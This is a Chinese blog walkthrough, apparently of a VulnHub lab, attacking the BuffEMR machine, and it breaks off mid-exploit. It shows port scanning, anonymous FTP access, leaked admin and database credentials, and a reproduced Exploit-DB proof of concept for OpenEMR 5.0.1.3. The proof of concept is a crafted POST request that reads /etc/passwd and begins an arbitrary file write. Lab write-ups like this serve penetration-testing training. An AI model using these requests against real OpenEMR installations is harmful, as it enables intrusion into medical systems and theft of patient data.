<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="该文章暂无概述">
<meta property="og:type" content="article">
<meta property="og:title" content="BuffEMR: 1.0.1">
<meta property="og:url" content="https://z9m8r8.github.io/2024/09/23/BuffEMR%201.0.1/index.html">
<meta property="og:site_name" content="z9m8r8&#39;s Blog">
<meta property="og:description" content="该文章暂无概述">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-09-22T16:00:00.000Z">
<meta property="article:modified_time" content="2024-10-10T14:00:36.484Z">
<meta property="article:author" content="z9m8r8">
<meta property="article:tag" content="Vulnhub">
<meta property="article:tag" content="信息收集">
<meta property="article:tag" content="提权">
<meta property="article:tag" content="反弹 shell">
<meta property="article:tag" content="FTP">
<meta property="article:tag" content="OpenEMR">
<meta property="article:tag" content="fcrackzip">
<meta property="article:tag" content="Command Injection">
<meta property="article:tag" content="Buffer Overflow">
<meta property="article:tag" content="缓冲区溢出">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://z9m8r8.github.io/2024/09/23/BuffEMR%201.0.1/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/09/23/BuffEMR%201.0.1/","path":"2024/09/23/BuffEMR 1.0.1/","title":"BuffEMR: 1.0.1"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>BuffEMR: 1.0.1 | z9m8r8's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">z9m8r8's Blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ftp-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. ftp 信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.4. Web 信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="nav-text">2.1. 获取 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3-buffemr"><span class="nav-text">2.2. 提权至 buffemr</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3-root"><span class="nav-text">2.3. 提权至 root</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%9B%98"><span class="nav-text">3. 复盘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#openemr-os-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">3.1. OpenEMR OS 命令注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-text">3.1.1. 分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-text">3.1.2. 测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-text">3.1.3. 修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="nav-text">3.2. 缓冲区溢出漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81"><span class="nav-text">3.2.1. 关键代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-text">3.2.2. 利用思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E6%93%8D"><span class="nav-text">3.2.3. 实操</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">4. 参考</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="z9m8r8"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">z9m8r8</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">186</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">177</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/09/23/BuffEMR%201.0.1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="z9m8r8">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="z9m8r8's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="BuffEMR: 1.0.1 | z9m8r8's Blog">
      <meta itemprop="description" content="该文章暂无概述">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          BuffEMR: 1.0.1
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-09-23 00:00:00" itemprop="dateCreated datePublished" datetime="2024-09-23T00:00:00+08:00">2024-09-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-10-10 22:00:36" itemprop="dateModified" datetime="2024-10-10T22:00:36+08:00">2024-10-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>8.9k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>32 分钟</span>
    </span>
</div>

            <div class="post-description">该文章暂无概述</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><blockquote>
<p>靶机：<a
target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/buffemr-101,717/">BuffEMR: 1.0.1 ~
VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p>靶机：192.168.1.155</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sS -sV 192.168.1.155 -p-            </span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 04:51 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.155</span><br><span class="line">Host is up (0.00080s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">MAC Address: 00:0C:29:27:AD:A6 (VMware)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 12.52 seconds</span><br></pre></td></tr></table></figure>
<h3 id="ftp-信息收集">1.3. ftp 信息收集</h3>
<p>服务端有部署FTP，经测可匿名【Anonymous】登录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># ftp 192.168.1.155                           </span></span><br><span class="line">Connected to 192.168.1.155.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.1.155:root): Anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span> -al</span><br><span class="line">229 Entering Extended Passive Mode (|||45284|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    3 0        128          4096 Jun 21  2021 .</span><br><span class="line">drwxr-xr-x    3 0        128          4096 Jun 21  2021 ..</span><br><span class="line">drwxr-xr-x    3 0        0            4096 Jun 21  2021 share</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> share</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span> -al</span><br><span class="line">229 Entering Extended Passive Mode (|||20800|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    3 0        0            4096 Jun 21  2021 .</span><br><span class="line">drwxr-xr-x    3 0        128          4096 Jun 21  2021 ..</span><br><span class="line">-rw-r--r--    1 0        0              20 Jun 21  2021 README</span><br><span class="line">drwxr-xr-x   31 0        0            4096 Jun 21  2021 openemr</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>
<p>FTP 下找到个 openemr CMS 的源码，推测 80 部署了 openemr ，在
/share/openemr/tests/test.accounts 中找到了可能的管理员登录凭证
<code>admin:Monster123</code></p>
<p>另外，在 FTP 的 /share/openemr/sites/default/sqlconf.php
中寻得数据库配置信息</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//  OpenEMR</span></span><br><span class="line"><span class="comment">//  MySQL Config</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$host</span>	= <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$port</span>	= <span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line"><span class="variable">$login</span>	= <span class="string">&#x27;openemruser&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span>	= <span class="string">&#x27;openemruser123456&#x27;</span>;</span><br><span class="line"><span class="variable">$dbase</span>	= <span class="string">&#x27;openemr&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Added ability to disable</span></span><br><span class="line"><span class="comment">//utf8 encoding - bm 05-2009</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$disable_utf8_flag</span>;</span><br><span class="line"><span class="variable">$disable_utf8_flag</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sqlconf</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$sqlconf</span>;</span><br><span class="line"><span class="variable">$sqlconf</span>[<span class="string">&quot;host&quot;</span>]= <span class="variable">$host</span>;</span><br><span class="line"><span class="variable">$sqlconf</span>[<span class="string">&quot;port&quot;</span>] = <span class="variable">$port</span>;</span><br><span class="line"><span class="variable">$sqlconf</span>[<span class="string">&quot;login&quot;</span>] = <span class="variable">$login</span>;</span><br><span class="line"><span class="variable">$sqlconf</span>[<span class="string">&quot;pass&quot;</span>] = <span class="variable">$pass</span>;</span><br><span class="line"><span class="variable">$sqlconf</span>[<span class="string">&quot;dbase&quot;</span>] = <span class="variable">$dbase</span>;</span><br><span class="line"><span class="comment">//////////////////////////</span></span><br><span class="line"><span class="comment">//////////////////////////</span></span><br><span class="line"><span class="comment">//////////////////////////</span></span><br><span class="line"><span class="comment">//////DO NOT TOUCH THIS///</span></span><br><span class="line"><span class="variable">$config</span> = <span class="number">1</span>; <span class="comment">/////////////</span></span><br><span class="line"><span class="comment">//////////////////////////</span></span><br><span class="line"><span class="comment">//////////////////////////</span></span><br><span class="line"><span class="comment">//////////////////////////</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="web-信息收集">1.4. Web 信息收集</h3>
<p>经测 80 确实部署了 openemr，利用前面的 <code>admin:Monster123</code>
可成功登录，进一步得版本为 5.0.1.3</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409221033810.jpg" /></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>查询 openemr cms 的历史漏洞 <code>searchsploit openemr</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409221037598.jpg" /></p>
<p>经测 <code>(Authenticated) Arbitrary File Actions</code>
中的任意文件读取漏洞【CVE-2018-15140 Arbitrary File
Read】可正常利用，不过写文件未测试成功</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─# cat /usr/share/exploitdb/exploits/linux/webapps/45202.txt</span><br><span class="line"># Exploit Title: OpenEMR 5.0.1.3 - Arbitrary File Actions</span><br><span class="line"># Date: 2018-08-14</span><br><span class="line"># Exploit Author: Joshua Fam</span><br><span class="line"># Twitter : @Insecurity</span><br><span class="line"># Vendor Homepage: https://www.open-emr.org/</span><br><span class="line"># Software Link: https://github.com/openemr/openemr/archive/v5_0_1_3.tar.gz</span><br><span class="line"># Version: &lt; 5.0.1.3</span><br><span class="line"># Tested on: Ubuntu LAMP, OpenEMR Version 5.0.1.3</span><br><span class="line"># CVE : CVE-2018-15142,CVE-2018-15141,CVE-2018-15140</span><br><span class="line"></span><br><span class="line"># 1.Arbitrary File Read:</span><br><span class="line"># In OpenEmr a user that has access to the portal can send a malcious</span><br><span class="line"># POST request to read arbitrary files.</span><br><span class="line"></span><br><span class="line"># i.Vulnerable Code:</span><br><span class="line">#  if ($_POST[&#x27;mode&#x27;] == &#x27;get&#x27;) &#123;</span><br><span class="line">#    echo file_get_contents($_POST[&#x27;docid&#x27;]);</span><br><span class="line">#    exit;</span><br><span class="line">#  &#125;</span><br><span class="line"></span><br><span class="line"># ii. Proof of Concept:</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/openemr/portal/import_template.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>hostname</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101        Firefox/52.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>OpenEMR=k3m0vq90hhb5et06rib5l7l8fq; PHPSESSID=1dbh9mom6ib07jqovfusgjc3vs</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>26</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">mode</span>=get&amp;docid=/etc/passwd</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="comment"># 2.Arbitrary File Write:</span></span></span><br><span class="line"><span class="language-apache"><span class="comment"># In OpenEmr a user that has access to the portal can send a malcious</span></span></span><br><span class="line"><span class="language-apache"><span class="comment"># POST request to write arbitrary files.</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="comment">#  i. Vulnerable Code:</span></span></span><br><span class="line"><span class="language-apache"><span class="comment">#    &#125; else if ($_POST[&#x27;mode&#x27;] == &#x27;save&#x27;) &#123;</span></span></span><br><span class="line"><span class="language-apache"><span class="comment">#        file_put_contents($_POST[&#x27;docid&#x27;], $_POST[&#x27;content&#x27;]);</span></span></span><br><span class="line"><span class="language-apache"><span class="comment">#        exit(true);</span></span></span><br><span class="line"><span class="language-apache"><span class="comment">#    &#125;</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="comment">#  ii. Proof of Concept:</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">POST</span> /openemr/portal/import_template.php HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: hostname</span></span><br><span class="line"><span class="language-apache"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (X11; Linux x86_64; rv:<span class="number">52</span>.<span class="number">0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">52</span>.<span class="number">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,*/*;q=<span class="number">0</span>.<span class="number">8</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Language: en-US,en;q=<span class="number">0</span>.<span class="number">5</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Cookie</span>: OpenEMR=k3m0vq90hhb5et06rib5l7l8fq; PHPSESSID=<span class="number">1</span>dbh9mom6ib07jqovfusgjc3vs</span></span><br><span 